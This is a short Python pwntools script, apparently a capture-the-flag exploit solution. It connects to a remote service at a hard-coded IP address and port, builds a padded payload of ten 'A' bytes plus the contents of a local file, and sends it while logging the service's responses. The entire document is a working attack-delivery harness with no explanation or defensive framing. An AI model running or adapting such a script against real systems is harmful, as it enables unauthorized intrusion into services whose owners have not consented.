from pwn import *
import sys

p = remote("108.136.235.250", 9006)

payload = b'A' * 10


f = open("text-output.txt", "rb")
payload += f.read()

sys.stdout.buffer.write(payload)

log.info(p.clean())


p.sendline(payload)

log.info(p.clean())
